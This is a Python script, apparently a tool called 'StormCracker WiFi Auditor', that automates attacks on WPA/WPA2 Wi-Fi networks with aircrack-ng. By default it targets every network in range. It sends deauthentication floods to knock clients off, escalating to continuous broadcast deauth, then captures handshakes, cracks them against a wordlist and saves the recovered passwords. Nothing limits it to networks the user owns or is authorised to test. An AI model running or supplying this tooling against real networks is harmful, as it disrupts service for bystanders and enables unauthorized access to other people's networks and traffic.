import subprocess
import os
import time
import csv
import signal
import sys
import glob
import shutil
import argparse

INTERFACE_DEFAULT = "wlan1"
WORDLIST_DEFAULT = "/usr/share/wordlists/rockyou.txt"
SCAN_TIMEOUT = 15
CAPTURE_TIMEOUT_DEFAULT = 60
DEAUTH_PACKETS = 10
TEMP_DIR = "audit_temp"
HANDSHAKES_DIR = "handshakes"
CRACKED_PASSWORDS_FILE = "cracked_passwords.txt"
LOG_FILE = "audit.log"

ACTIVE_PROCS = []
ORIGINAL_MODE_RESTORE = None

def log(message):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    formatted_msg = f"[{timestamp}] {message}"
    print(formatted_msg)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(formatted_msg + "\n")
    except Exception:
        pass

def run_cmd(cmd, check=True, timeout=None):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check, timeout=timeout)
        return result.stdout
    except subprocess.CalledProcessError as e:
        log(f"Error executing: {cmd}\n{e.stderr}")
        return None
    except subprocess.TimeoutExpired:
        log(f"Timeout executing: {cmd}")
        return None

def check_dependencies():
    tools = ["aircrack-ng", "aireplay-ng", "iwconfig", "airmon-ng"]
    missing = [tool for tool in tools if shutil.which(tool) is None]
    if missing:
        log(f"CRITICAL: Missing required tools: {', '.join(missing)}")
        sys.exit(1)
    log("All dependencies verified.")

def kill_subprocesses():
    for proc in ACTIVE_PROCS:
        if proc.poll() is None:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.wait(timeout=2)
            except ProcessLookupError:
                pass
            except Exception:
                try:
                    proc.terminate()
                except Exception:
                    pass
    ACTIVE_PROCS.clear()

def cleanup(signum=None, frame=None):
    if signum:
        log(f"\nCaught signal {signum}. Cleaning up...")
    
    kill_subprocesses()
    
    if ORIGINAL_MODE_RESTORE:
        log(f"Restoring interface {ORIGINAL_MODE_RESTORE} to managed mode...")
        run_cmd(f"ip link set {ORIGINAL_MODE_RESTORE} down", check=False)
        run_cmd(f"iw dev {ORIGINAL_MODE_RESTORE} set type managed", check=False)
        run_cmd(f"ip link set {ORIGINAL_MODE_RESTORE} up", check=False)

    if signum:
        sys.exit(1)

def get_monitor_interface(args):
    global ORIGINAL_MODE_RESTORE
    iface = args.interface

    # --- KILL INTERFERING SERVICES (Fixes empty scans) ---
    log("Killing interfering network services (NetworkManager, wpa_supplicant)...")
    run_cmd("airmon-ng check kill", check=False)

    if not iface:
        output = run_cmd("iwconfig 2>/dev/null", check=False)
        if output:
            for line in output.splitlines():
                if line and not line.startswith(" "):
                    current_iface = line.split()[0]
                if current_iface and ("Mode:Monitor" in line or "Mode: Monitor" in line):
                    log(f"Detected monitor mode interface: {current_iface}")
                    return current_iface
            
            available_ifaces = []
            for line in output.splitlines():
                if line and not line.startswith(" ") and "no wireless extensions" not in line:
                    iface_name = line.split()[0]
                    if iface_name:
                        available_ifaces.append(iface_name)
            
            if INTERFACE_DEFAULT in available_ifaces:
                iface = INTERFACE_DEFAULT
            elif available_ifaces:
                iface = available_ifaces[0]
            else:
                log("CRITICAL: No wireless interfaces detected.")
                sys.exit(1)
            
            log(f"Auto-selected interface: {iface}")
        else:
            log("CRITICAL: Failed to run iwconfig.")
            sys.exit(1)

    log(f"Checking specified interface: {iface}")
    output = run_cmd(f"iwconfig {iface} 2>/dev/null", check=False)
    
    if output and ("Mode:Monitor" in output or "Mode: Monitor" in output):
        log(f"Interface {iface} is already in monitor mode.")
        return iface
        
    log(f"Setting {iface} to Monitor mode...")
    run_cmd(f"ip link set {iface} down", check=False)
    run_cmd(f"iw dev {iface} set type monitor", check=False)
    run_cmd(f"ip link set {iface} up", check=False)
    
    check_out = run_cmd(f"iwconfig {iface} 2>/dev/null", check=False)
    if check_out and ("Mode:Monitor" in check_out or "Mode: Monitor" in check_out):
        log(f"Successfully switched {iface} to monitor mode.")
        ORIGINAL_MODE_RESTORE = iface
        return iface
    else:
        log(f"CRITICAL: Failed to set {iface} to monitor mode.")
        sys.exit(1)

# ========== UNIVERSAL PARSER (Fixes Header Hell) ==========
def find_column_index(headers, possible_names):
    """Find a header index by case-insensitive substring match."""
    for i, h in enumerate(headers):
        h_clean = h.strip().lower()
        for p in possible_names:
            if p in h_clean or h_clean in p:
                return i
    return -1

def parse_scan_csv(csv_file, args):
    targets = []
    if not os.path.exists(csv_file):
        log(f"CSV file not found: {csv_file}")
        return targets
    
    try:
        with open(csv_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            
        # Strip empty lines and stop at "Station MAC" (client section)
        ap_lines = []
        for line in lines:
            if "Station MAC" in line or "Station" in line:
                break
            if line.strip() == "":
                continue
            ap_lines.append(line)

        if not ap_lines:
            log("CSV is empty (no AP data found).")
            return targets

        reader = csv.reader(ap_lines)
        headers = next(reader, None)
        if not headers:
            log("CSV has no headers.")
            return targets
        
        headers = [h.strip() for h in headers]
        log(f"Detected headers: {headers}")

        # --- DYNAMIC MAPPING ---
        bssid_idx = find_column_index(headers, ['bssid'])
        channel_idx = find_column_index(headers, ['channel', 'ch'])
        essid_idx = find_column_index(headers, ['essid'])
        privacy_idx = find_column_index(headers, ['privacy', 'enc', 'encryption'])
        power_idx = find_column_index(headers, ['power', 'pwr', 'signal'])

        # Validate we found everything
        if -1 in [bssid_idx, channel_idx, essid_idx, privacy_idx, power_idx]:
            log("ERROR: Could not find required columns in CSV headers.")
            return targets

        for row in reader:
            if len(row) <= max(bssid_idx, channel_idx, essid_idx, privacy_idx, power_idx):
                continue
                
            bssid = row[bssid_idx].strip()
            channel = row[channel_idx].strip()
            essid = row[essid_idx].strip()
            privacy = row[privacy_idx].strip()
            power_raw = row[power_idx].strip()
            
            try:
                power_val = int(power_raw)
            except ValueError:
                power_val = -100

            # Filter: Must be WPA/WPA2 and have valid signal
            if bssid and channel and ("WPA" in privacy or "WPA2" in privacy):
                if args.target and args.target not in (essid, bssid):
                    continue
                if power_val < args.min_signal or power_val == -1:
                    continue
                
                targets.append({
                    'bssid': bssid,
                    'channel': channel,
                    'essid': essid if essid else "<Hidden>",
                    'power': power_val
                })
                
    except Exception as e:
        log(f"Error parsing CSV: {e}")
        
    targets.sort(key=lambda x: x['power'], reverse=True)
    return targets

def get_active_clients(csv_file, target_bssid):
    clients = []
    if not os.path.exists(csv_file): 
        return clients
    try:
        with open(csv_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        in_client_section = False
        for line in lines:
            if "Station MAC" in line:
                in_client_section = True
                continue
            if in_client_section and line.strip():
                parts = line.split(',')
                if len(parts) >= 6:
                    client_mac = parts[0].strip()
                    bssid = parts[5].strip()
                    if bssid == target_bssid and client_mac != target_bssid:
                        clients.append(client_mac)
    except Exception:
        pass
    return clients

def has_handshake(cap_file):
    output = run_cmd(f"aircrack-ng {cap_file}", check=False)
    return output and ("1 handshake" in output or "Handshake" in output)

def run_auditor(args):
    if os.geteuid() != 0:
        print("This script must be run with sudo.")
        sys.exit(1)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    log("=== StormCracker Autonomous WiFi Auditor Initialized ===")
    
    try:
        check_dependencies()

        if not os.path.exists(args.wordlist):
            log(f"CRITICAL: Wordlist not found at {args.wordlist}")
            sys.exit(1)

        os.makedirs(TEMP_DIR, exist_ok=True)
        os.makedirs(HANDSHAKES_DIR, exist_ok=True)
        
        interface = get_monitor_interface(args)

        # ========== PHASE 1: SCAN (Manual Process Control) ==========
        log(f"Phase 1: Starting broad scan ({SCAN_TIMEOUT}s)...")
        scan_id = int(time.time())
        scan_prefix = os.path.join(TEMP_DIR, f"scan_{scan_id}")
        
        # Run airodump in the background (no 'timeout' wrapper)
        scan_cmd = f"airodump-ng -w {scan_prefix} --output-format csv {interface}"
        scan_proc = subprocess.Popen(
            scan_cmd,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True,
            start_new_session=True
        )
        ACTIVE_PROCS.append(scan_proc)
        
        # Let it run for the specified time
        time.sleep(SCAN_TIMEOUT)
        
        # Gracefully kill it with SIGINT (so it flushes the CSV)
        os.killpg(os.getpgid(scan_proc.pid), signal.SIGINT)
        scan_proc.wait(timeout=5)
        
        # Capture stderr to see if the card complained
        stderr_output = scan_proc.stderr.read()
        if stderr_output:
            log(f"airodump-ng warnings: {stderr_output.strip()}")
        
        ACTIVE_PROCS.remove(scan_proc)
        time.sleep(1.5)  # Extra time for file flush

        csv_path = f"{scan_prefix}-01.csv"
        if not os.path.exists(csv_path) or os.path.getsize(csv_path) == 0:
            log("CRITICAL: Scan CSV is empty or missing. Check if interface is capturing.")
            # Fallback: try to read headers anyway
            if os.path.exists(csv_path):
                log("CSV exists but has 0 bytes. Driver may not support monitor mode on this channel.")
            return

        targets = parse_scan_csv(csv_path, args)

        if not targets:
            log("No WPA/WPA2 targets found. Check signal strength or target filters.")
            return

        # ========== PHASE 2: CAPTURE ==========
        log(f"Phase 2: Targeting {len(targets)} networks...")
        captured_caps = []

        for target in targets:
            clean_essid = "".join([c if c.isalnum() else "_" for c in target['essid']]) or "unknown"
            expected_save_path = os.path.join(HANDSHAKES_DIR, f"{clean_essid}_{target['bssid'].replace(':', '')}.cap")
            
            if os.path.exists(expected_save_path) and has_handshake(expected_save_path):
                log(f"Skipping: Handshake already exists for {target['essid']}.")
                captured_caps.append(expected_save_path)
                continue
                
            log(f"Locking: {target['essid']} ({target['bssid']}) | PWR: {target['power']} | CH: {target['channel']}")
            
            cap_prefix = os.path.join(TEMP_DIR, f"cap_{target['bssid'].replace(':', '')}")
            dump_cmd = f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_prefix} --output-format pcap,csv {interface}"
            
            dump_proc = subprocess.Popen(
                dump_cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            ACTIVE_PROCS.append(dump_proc)
            
            start_time = time.time()
            handshake_found = False
            last_deauth = 0
            deauth_escalation = 0
            
            while time.time() - start_time < args.timeout:
                cap_files = glob.glob(f"{cap_prefix}-*.cap")
                if cap_files:
                    current_cap = sorted(cap_files)[-1]
                    if has_handshake(current_cap):
                        log(f"Success! Handshake captured for {target['essid']}.")
                        shutil.copy(current_cap, expected_save_path)
                        captured_caps.append(expected_save_path)
                        handshake_found = True
                        kill_subprocesses()
                        break
                
                if time.time() - last_deauth > 12:
                    csv_files = glob.glob(f"{cap_prefix}-*.csv")
                    clients = []
                    if csv_files:
                        clients = get_active_clients(sorted(csv_files)[-1], target['bssid'])
                    
                    if clients:
                        for client in set(clients):
                            log(f"Deauthing client: {client}")
                            run_cmd(f"aireplay-ng -0 {DEAUTH_PACKETS} -a {target['bssid']} -c {client} {interface} < /dev/null > /dev/null 2>&1", check=False)
                    else:
                        log(f"No clients. Broadcast deauth to {target['essid']}...")
                        if deauth_escalation > 2:
                            run_cmd(f"aireplay-ng -0 0 -a {target['bssid']} {interface} < /dev/null > /dev/null 2>&1", check=False)
                        else:
                            run_cmd(f"aireplay-ng -0 {DEAUTH_PACKETS} -a {target['bssid']} {interface} < /dev/null > /dev/null 2>&1", check=False)
                        deauth_escalation += 1
                    
                    last_deauth = time.time()

                time.sleep(2)
            
            if not handshake_found:
                log(f"Failed to capture handshake for {target['essid']}.")
                kill_subprocesses()

        # ========== PHASE 3: CRACKING ==========
        if args.skip_crack:
            log("Skipping crack phase.")
            return

        if captured_caps:
            log(f"Phase 3: Cracking {len(captured_caps)} handshakes...")
            print("\n" + "="*50)
            print("AIRCRACK-NG ENGINE")
            print("="*50 + "\n")
            
            cracked_count = 0
            for cap in captured_caps:
                essid = os.path.basename(cap).split('_')[0] 
                log(f"Cracking: {essid}")
                temp_key_file = os.path.join(TEMP_DIR, f"{essid}_key.txt")
                if os.path.exists(temp_key_file):
                    os.remove(temp_key_file)
                
                crack_cmd = f"aircrack-ng -w {args.wordlist} -l {temp_key_file} {cap}"
                try:
                    subprocess.call(crack_cmd, shell=True)
                except KeyboardInterrupt:
                    print(f"\nInterrupted for {essid}. Moving on...")
                    continue
                
                if os.path.exists(temp_key_file):
                    with open(temp_key_file, 'r') as f:
                        password = f.read().strip()
                    if password:
                        log(f"VICTORY! [{essid}] Password: {password}")
                        with open(CRACKED_PASSWORDS_FILE, "a") as cpf:
                            cpf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {essid} | {password}\n")
                        cracked_count += 1
                    os.remove(temp_key_file)
                else:
                    log(f"Failed to crack {essid}.")
            
            print("\n" + "="*50)
            log(f"Cracking complete. Found {cracked_count} passwords.")
            if cracked_count > 0:
                log(f"Results saved to: {CRACKED_PASSWORDS_FILE}")
        else:
            log("No handshakes captured.")

    finally:
        cleanup()
        log("Session concluded.")

def parse_args():
    parser = argparse.ArgumentParser(description="StormCracker WiFi Auditor")
    parser.add_argument("-i", "--interface", help="Interface (e.g., wlan1)")
    parser.add_argument("-w", "--wordlist", default=WORDLIST_DEFAULT)
    parser.add_argument("-t", "--target", help="Target ESSID or BSSID")
    parser.add_argument("-s", "--min-signal", type=int, default=-100)
    parser.add_argument("--timeout", type=int, default=CAPTURE_TIMEOUT_DEFAULT)
    parser.add_argument("--skip-crack", action="store_true")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    
    if os.environ.get("WIFI_AUDITOR_INHIBITED") != "1":
        print("[SYSTEM] Engaging Wake Lock...")
        cmd = [
            "systemd-inhibit",
            "--what=sleep:idle",
            "--who=WiFi Auditor",
            "--why=Running audit",
            sys.executable
        ] + sys.argv
        env = os.environ.copy()
        env["WIFI_AUDITOR_INHIBITED"] = "1"
        try:
            subprocess.run(cmd, env=env)
        except FileNotFoundError:
            print("[SYSTEM] Wake lock unavailable. Running directly.")
            run_auditor(args)
        except KeyboardInterrupt:
            sys.exit(130)
    else:
        run_auditor(args)